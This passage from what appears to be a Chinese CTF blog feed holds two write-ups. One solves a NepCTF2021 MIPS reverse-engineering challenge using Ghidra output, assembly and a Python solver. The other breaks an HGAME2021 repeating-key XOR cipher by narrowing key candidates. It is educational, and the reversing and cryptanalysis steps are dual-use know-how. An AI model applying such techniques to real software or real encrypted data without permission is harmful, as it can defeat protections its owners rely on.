class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tty_write</span><span class="params">(<span class="keyword">char</span> *param_1,<span class="keyword">char</span> *param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> __fd;</span><br><span class="line">  <span class="keyword">size_t</span> __n;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  EVP_PKEY_CTX aEStack56 [<span class="number">20</span>];</span><br><span class="line">  undefined4 local_24;</span><br><span class="line">  undefined4 local_20;</span><br><span class="line">  undefined4 local_1c;</span><br><span class="line">  undefined4 local_18;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="keyword">char</span> local_10;</span><br><span class="line">  <span class="keyword">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  local_c = __stack_chk_guard;</span><br><span class="line">  local_24 = <span class="number">0x666c6167</span>;</span><br><span class="line">  local_20 = <span class="number">0x7b69745f</span>;</span><br><span class="line">  local_1c = <span class="number">0x69735f5f</span>;</span><br><span class="line">  local_18 = <span class="number">0x5f5f6661</span>;</span><br><span class="line">  local_14 = <span class="number">0x6b657d0a</span>;</span><br><span class="line">  local_10 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  __fd = open(param_1,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (__fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cannot open&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __n = <span class="built_in">strlen</span>(param_2);</span><br><span class="line">  write(__fd,param_2,__n);</span><br><span class="line">  read(__fd,aEStack56,<span class="number">0x13</span>);</span><br><span class="line">  encry(aEStack56);</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)aEStack56,(<span class="keyword">char</span> *)&amp;local_24);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    write(__fd,<span class="string">&quot;you get the fake flag\n&quot;</span>,<span class="number">0x16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="keyword">char</span> *)aEStack56,<span class="string">&quot;3_isjA0UeQZcNa\\`\\Vf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you_don\&#x27;t_get_the_flag&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_00400b48;</span><br><span class="line">    &#125;</span><br><span class="line">    write(__fd,<span class="string">&quot;good_job!\n&quot;</span>,<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(__fd);</span><br><span class="line">LAB_00400b48:</span><br><span class="line">  <span class="keyword">if</span> (local_c != __stack_chk_guard) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前在 ida 中发现 <code>local_24</code> 是一个fake flag，就不管了</p><p>发现调用了一个 <code>encry</code> 函数，进入这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encry</span><span class="params">(EVP_PKEY_CTX *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cVar1;</span><br><span class="line">  <span class="keyword">int</span> local_10;</span><br><span class="line">  </span><br><span class="line">  init(param_1);</span><br><span class="line">  cVar1 = <span class="string">&#x27;\x05&#x27;</span>;</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_10 &lt; <span class="number">0x13</span>) &#123;</span><br><span class="line">    param_1[local_10] = (EVP_PKEY_CTX)((<span class="keyword">char</span>)param_1[local_10] - cVar1);</span><br><span class="line">    cVar1 = cVar1 + <span class="string">&#x27;\x01&#x27;</span>;</span><br><span class="line">    local_10 = local_10 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现先调用了 <code>init</code> 函数，然后对每一位做了个减法</p><p>查看 <code>init</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">(EVP_PKEY_CTX *ctx)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">char</span> extraout_var;</span><br><span class="line">  <span class="keyword">char</span> extraout_var_00;</span><br><span class="line">  <span class="keyword">char</span> extraout_var_01;</span><br><span class="line">  <span class="keyword">int</span> local_20;</span><br><span class="line">  </span><br><span class="line">  iVar1 = __stack_chk_guard;</span><br><span class="line">  srand(<span class="number">0x1c5e</span>);</span><br><span class="line">  rand();</span><br><span class="line">  rand();</span><br><span class="line">  rand();</span><br><span class="line">  *ctx = (EVP_PKEY_CTX)((byte)*ctx ^ extraout_var + <span class="number">0x32</span>U);</span><br><span class="line">  ctx[<span class="number">5</span>] = (EVP_PKEY_CTX)((byte)ctx[<span class="number">5</span>] ^ extraout_var_00 - <span class="number">0x39</span>U);</span><br><span class="line">  ctx[<span class="number">6</span>] = (EVP_PKEY_CTX)((byte)ctx[<span class="number">6</span>] ^ extraout_var_01 + <span class="number">0x30</span>U);</span><br><span class="line">  local_20 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_20 &lt; <span class="number">0xd</span>) &#123;</span><br><span class="line">    local_20 = local_20 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != __stack_chk_guard) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __stack_chk_guard;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里自动分析出现了问题，不知道 <code>extraout_var</code> 和 <code>rand</code> 有什么关系</p><p>于是只能去找对应的汇编慢慢读</p><p>根据 Ghidra 里代码与汇编的映射关系，找到了 <code>extraout_var</code> 的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00400d00 80  43  00  00    lb         v1,0x0 (v0)</span><br><span class="line">00400d04 8f  c2  00  24    lw         v0,local_1c (s8)</span><br><span class="line">00400d08 30  42  00  ff    andi       v0,v0,0xff</span><br><span class="line">00400d0c 24  42  00  32    addiu      v0,v0,0x32</span><br><span class="line">00400d10 30  42  00  ff    andi       v0,v0,0xff</span><br><span class="line">00400d14 7c  02  14  20    seb        v0,v0</span><br><span class="line">00400d18 00  62  10  26    xor        v0,v1,v0</span><br><span class="line">00400d1c 7c  02  1c  20    seb        v1,v0</span><br><span class="line">00400d20 8f  c2  00  1c    lw         v0,local_24 (s8)</span><br><span class="line">00400d24 a0  43  00  00    sb         v1,0x0 (v0)</span><br></pre></td></tr></table></figure><p>找到 <code>addiu</code> 说明 <code>v0</code> 对应的就是 <code>extraout_var</code>，发现是从 <code>local_1c</code> 处取出的</p><p>往上找 <code>local_1c</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00400c80 8f  dc  00  10    lw         gp,local_30 (s8)</span><br><span class="line">00400c84 8f  82  80  44    lw         v0,-0x7fbc (gp)&#x3D;&gt;-&gt;rand                          &#x3D; 004010e0</span><br><span class="line">00400c88 00  40  c8  25    or         t9,v0,zero</span><br><span class="line">00400c8c 03  20  f8  09    jalr       t9&#x3D;&gt;rand                                         int rand(void)</span><br><span class="line">00400c90 00  00  00  00    _nop</span><br><span class="line">00400c94 8f  dc  00  10    lw         gp,local_30 (s8)</span><br><span class="line">00400c98 00  40  18  25    or         v1,v0,zero</span><br><span class="line">00400c9c 83  c2  00  31    lb         v0,local_10 +0x1 (s8)</span><br><span class="line">00400ca0 00  62  10  26    xor        v0,v1,v0</span><br><span class="line">00400ca4 00  02  16  03    sra        v0,v0,0x18</span><br><span class="line">00400ca8 af  c2  00  24    sw         v0,local_1c (s8)</span><br></pre></td></tr></table></figure><p>从后往前看，最后是将 v0 存到 local_1c 中，倒数第二步是将 v0 右移 0x18 位（这里问了一下会mips的大佬…），虽然没法完美分析出 rand 的结果存到了哪里，但是可以猜测最后右移了 0x18 位并存到了 <code>local_1c</code> 中。</p><p>于是就可以尝试编写代码，破解flag了。</p><p>首先计算几个 <code>rand</code> 的结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    srand(<span class="number">0x1c5e</span>);</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">20</span>];</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">&#x27;8&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, rand());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, rand());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, rand());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./test_rand</span><br><span class="line">446aef60</span><br><span class="line">5de30bb4</span><br><span class="line">27445d71</span><br></pre></td></tr></table></figure><p>随后写个反向的算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">encry = <span class="string">b&#x27;3_isjA0UeQZcNa\\`\\Vf&#x27;</span></span><br><span class="line">flag_1 = []</span><br><span class="line">t = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encry:</span><br><span class="line">    flag_1.append(i + t)</span><br><span class="line">    t += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> (flag_1)</span><br><span class="line"></span><br><span class="line">rand = [<span class="number">0x44</span> + <span class="number">0x32</span>, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x5d</span> - <span class="number">0x39</span>, <span class="number">0x27</span> + <span class="number">0x30</span>] + [<span class="number">0</span>] * <span class="number">15</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_1)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(flag_1[i] ^ (rand[i] &amp; <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><p>得到最终的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">56</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">115</span>, <span class="number">75</span>, <span class="number">59</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">125</span>]</span><br><span class="line">Nep&#123;solar_is_sotql&#125;</span><br></pre></td></tr></table></figure><h1 id="worrrrms-（go语言逆向）"><a href="#worrrrms-（go语言逆向）" class="headerlink" title="worrrrms （go语言逆向）"></a>worrrrms （go语言逆向）</h1><p>只知道用了SM4算法加密，不会go语言，具体的看不懂，爬了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个比赛的前五道题其实就是各个方向的入门题目，有相应的工具并且能够看懂伪代码就可以做了，只需要进行静态分析。做go语言的时候发现go的函数调用太奇怪了，而且有各种指针，不愧是最安全的语言。</p><p>至于后面的几道题，由于解的人太少，也就没有去看，看完wp再补。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;NepCTF2021 reverse 前四题&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2021 week1 crypto 对称之美</title>
    <link href="https://s0uthwood.github.io/2021/03/17/HGAME2021-week1-crypto-%E5%AF%B9%E7%A7%B0%E4%B9%8B%E7%BE%8E/"/>
    <id>https://s0uthwood.github.io/2021/03/17/HGAME2021-week1-crypto-%E5%AF%B9%E7%A7%B0%E4%B9%8B%E7%BE%8E/</id>
    <published>2021-03-17T12:06:09.000Z</published>
    <updated>2021-05-19T17:45:49.289Z</updated>
    
    <content type="html"><![CDATA[<p>密码学实验正好做到弗纳姆密码，发现寒假时做到过，因此记录一下</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([<span class="built_in">ord</span>(m)^<span class="built_in">ord</span>(k) <span class="keyword">for</span> m, k <span class="keyword">in</span> <span class="built_in">zip</span>(FLAG, itertools.cycle(key))])</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于给了大量的密文，完全可以对密钥空间进行范围上的缩小。</p><p>由于进行的是异或操作，且明文与密钥均为可见字符，只需要对相同位置的密文与所有可能的密钥字符进行异或计算，结果不在可见字符范围内的均可以排除掉。</p><p>经过初步筛选后密钥空间会小很多，进行爆破或者根据上下文手动选择即可。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># first = [94, 116, 57, 32, 54, 49, 33, 32, 54, 38, 116, 59, 37, 32, 32, 116, 60, 32, 57, 59, 51, 34, 38, 39, 116, 59, 116, 38, 60, 61, 35, 58, 39, 55, 59, 116, 49, 32, 48, 39, 55, 94, 59, 116, 38, 39, 116, 50, 59, 53, 48, 122, 60, 94, 116, 61, 54, 38, 38, 32, 39, 116, 56, 59, 53, 97, 1]</span></span><br><span class="line"><span class="comment"># first = [35, 25, 21, 25, 17, 2, 28, 3, 5, 21, 17, 3, 5, 80, 80, 18, 25, 31, 21, 31, 94, 21, 80, 4, 24, 31, 17, 3, 17, 4, 80, 80, 25, 17, 3, 0, 9, 24, 9, 25, 24, 17, 30, 3, 9, 80, 17, 17, 2, 80, 31, 80, 80, 22, 3, 3, 25, 9, 21, 24, 80, 17, 21, 80, 23, 93, 62]</span></span><br><span class="line"><span class="comment"># first = [78, 68, 89, 89, 91, 23, 83, 23, 67, 91, 89, 94, 82, 69, 78, 66, 89, 23, 67, 92, 23, 69, 67, 23, 86, 92, 89, 23, 83, 27, 67, 85, 84, 91, 82, 69, 25, 94, 23, 89, 94, 65, 23, 89, 23, 88, 23, 84, 23, 91, 64, 110, 68, 86, 78, 23, 91, 23, 23, 82, 61, 71, 68, 95, 13, 86, 89]</span></span><br><span class="line"><span class="comment"># first = [43, 102, 50, 33, 39, 76, 102, 50, 102, 39, 34, 50, 53, 35, 41, 53, 34, 53, 52, 102, 76, 39, 46, 47, 52, 102, 37, 43, 102, 102, 46, 41, 39, 106, 102, 35, 102, 53, 49, 33, 40, 41, 50, 39, 54, 52, 42, 35, 76, 47, 40, 41, 47, 37, 43, 47, 39, 39, 36, 52, 34, 54, 53, 35, 102, 25, 63]</span></span><br><span class="line"><span class="comment"># first = [3, 25, 29, 78, 0, 1, 12, 6, 7, 26, 78, 7, 64, 15, 27, 23, 78, 11, 23, 15, 58, 2, 7, 29, 10, 8, 7, 15, 100, 12, 15, 10, 2, 78, 1, 10, 100, 78, 6, 78, 9, 7, 6, 28, 15, 78, 1, 78, 15, 0, 78, 27, 10, 11, 3, 29, 26, 0, 1, 78, 7, 11, 78, 28, 100, 27, 49]</span></span><br><span class="line"><span class="comment"># first = [31, 18, 90, 21, 25, 15, 31, 31, 14, 31, 112, 21, 112, 22, 8, 90, 14, 31, 90, 14, 18, 90, 9, 90, 87, 21, 31, 3, 27, 15, 14, 19, 22, 27, 28, 27, 46, 25, 31, 27, 90, 30, 31, 22, 25, 24, 21, 19, 20, 31, 14, 93, 31, 90, 31, 90, 31, 30, 14, 9, 12, 27, 14, 31, 18, 41, 57]</span></span><br><span class="line"><span class="comment"># first = [69, 84, 94, 67, 84, 69, 17, 92, 17, 17, 94, 95, 104, 88, 17, 70, 89, 90, 70, 17, 84, 67, 31, 69, 70, 67, 95, 17, 17, 69, 17, 84, 72, 66, 17, 69, 89, 80, 69, 17, 85, 88, 17, 88, 90, 84, 90, 95, 85, 17, 89, 93, 66, 80, 69, 59, 67, 17, 89, 88, 88, 67, 89, 17, 86, 2, 0]</span></span><br><span class="line"><span class="comment"># first = [65, 93, 85, 19, 19, 29, 71, 64, 80, 71, 71, 82, 92, 73, 81, 92, 86, 19, 91, 82, 65, 86, 19, 91, 90, 19, 71, 93, 93, 19, 71, 64, 19, 19, 67, 92, 86, 94, 91, 94, 90, 93, 94, 93, 19, 82, 19, 19, 19, 64, 86, 95, 19, 65, 65, 88, 82, 90, 19, 87, 87, 19, 86, 90, 82, 85, 67]</span></span><br><span class="line"><span class="comment"># first = [49, 104, 104, 44, 45, 104, 32, 45, 41, 39, 32, 36, 61, 45, 58, 58, 104, 66, 45, 104, 45, 41, 28, 41, 58, 66, 104, 39, 41, 60, 32, 104, 59, 66, 39, 58, 58, 45, 45, 41, 38, 47, 45, 47, 39, 58, 41, 60, 33, 60, 104, 104, 39, 45, 33, 38, 36, 60, 59, 45, 33, 37, 104, 59, 37, 29, 0]</span></span><br><span class="line"><span class="comment"># first = [119, 35, 93, 37, 54, 3, 50, 59, 57, 119, 50, 119, 119, 119, 54, 60, 36, 56, 57, 39, 119, 36, 63, 35, 50, 62, 54, 35, 58, 63, 50, 32, 46, 32, 35, 36, 50, 119, 37, 35, 57, 119, 57, 123, 49, 36, 35, 63, 58, 37, 93, 36, 49, 119, 52, 56, 119, 112, 62, 119, 57, 56, 36, 119, 50, 102, 100]</span></span><br><span class="line"><span class="comment"># first = [57, 56, 49, 49, 51, 56, 112, 38, 112, 51, 34, 36, 61, 57, 57, 57, 51, 37, 112, 49, 49, 63, 53, 112, 52, 36, 62, 112, 53, 53, 57, 53, 61, 53, 53, 112, 54, 57, 112, 53, 53, 50, 37, 112, 112, 113, 112, 53, 49, 49, 61, 53, 112, 32, 49, 39, 35, 35, 52, 63, 55, 34, 49, 36, 43, 123, 34]</span></span><br><span class="line"><span class="comment"># first = [87, 92, 25, 78, 81, 80, 86, 92, 88, 86, 25, 92, 88, 77, 87, 87, 92, 77, 64, 80, 75, 87, 25, 78, 25, 23, 90, 81, 25, 64, 75, 75, 84, 75, 87, 86, 86, 87, 51, 21, 75, 92, 25, 51, 78, 51, 64, 25, 94, 80, 80, 92, 64, 75, 85, 87, 64, 25, 92, 95, 25, 92, 84, 81, 97, 13, 68]</span></span><br><span class="line"><span class="comment"># first = [65, 65, 17, 8, 65, 18, 3, 18, 13, 13, 2, 2, 24, 77, 65, 6, 15, 65, 14, 15, 4, 18, 107, 4, 21, 65, 4, 0, 7, 65, 65, 4, 4, 4, 21, 19, 19, 65, 2, 65, 65, 8, 14, 9, 14, 53, 14, 12, 8, 6, 5, 65, 14, 4, 79, 65, 12, 107, 18, 65, 13, 65, 4, 4, 81, 15, 107]</span></span><br><span class="line"><span class="comment"># first = [57, 61, 57, 54, 55, 120, 50, 116, 43, 55, 55, 48, 120, 120, 82, 120, 61, 43, 45, 44, 120, 120, 62, 127, 55, 23, 43, 46, 55, 51, 82, 120, 44, 120, 49, 120, 61, 48, 48, 59, 55, 54, 62, 45, 52, 57, 45, 49, 54, 48, 60, 58, 45, 44, 120, 57, 53, 47, 120, 44, 49, 55, 118, 120, 42, 60]</span></span><br><span class="line"><span class="comment"># first = [5, 27, 30, 16, 3, 20, 18, 87, 24, 5, 26, 25, 25, 21, 30, 21, 4, 14, 87, 30, 4, 17, 30, 5, 87, 2, 3, 18, 5, 25, 24, 21, 5, 3, 22, 7, 91, 22, 24, 22, 5, 16, 87, 25, 1, 28, 5, 5, 18, 3, 27, 24, 5, 3, 35, 4, 18, 31, 18, 31, 25, 5, 125, 17, 40, 83]</span></span><br><span class="line"><span class="comment"># first = [38, 55, 60, 114, 58, 61, 49, 88, 114, 33, 34, 59, 61, 39, 33, 55, 114, 63, 62, 60, 55, 61, 32, 55, 62, 32, 61, 114, 114, 55, 37, 51, 59, 58, 62, 32, 114, 60, 61, 38, 114, 114, 51, 53, 55, 55, 114, 32, 114, 114, 55, 38, 114, 43, 58, 114, 38, 55, 59, 59, 55, 114, 1, 62, 59, 52]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">char</span>):</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> first:</span><br><span class="line">        num = <span class="built_in">ord</span>(char) ^ c</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">0x20</span> <span class="keyword">or</span> <span class="number">0x7f</span> &lt;= num) <span class="keyword">and</span> num != <span class="number">0x0a</span>: <span class="comment"># 可能出现换行符</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> (test(c)):</span><br><span class="line">        <span class="built_in">print</span> (c, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># T</span></span><br><span class="line"><span class="comment"># b d e k l o p q r s t u w x y      final: p</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line"><span class="comment"># F</span></span><br><span class="line"><span class="comment"># n</span></span><br><span class="line"><span class="comment"># z</span></span><br><span class="line"><span class="comment"># b 1</span></span><br><span class="line"><span class="comment"># a c d e f g h i j k m n o p q r s t u v w x y z 0 1 2 3 4 5 7 9      final: 3</span></span><br><span class="line"><span class="comment"># H</span></span><br><span class="line"><span class="comment"># W</span></span><br><span class="line"><span class="comment"># C D E O P Q R S U V W             final: P</span></span><br><span class="line"><span class="comment"># k 9</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># X</span></span><br><span class="line"><span class="comment"># w</span></span><br><span class="line"><span class="comment"># x R</span></span><br></pre></td></tr></table></figure><p>将密文每十六个分一组，每一组相同位置对应的密钥应该是同一个，因此将这些密文字符组成一个 <code>list</code>，这里命名为 <code>first</code>。</p><p>对每一个位置进行密钥的初筛，最终可以得到代码块下面的注释所示的密钥空间</p><p>随便选择一组密钥进行解密运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;Tp7Fnz13HWP9aXwR&#x27;</span></span><br><span class="line">a = (<span class="built_in">bytes</span>([m ^ <span class="built_in">ord</span>(k) <span class="keyword">for</span> m, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, itertools.cycle(key))]))</span><br><span class="line"><span class="built_in">print</span> (a)</span><br></pre></td></tr></table></figure><p>对这些密钥进行手动筛查并更新密钥即可，过程如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 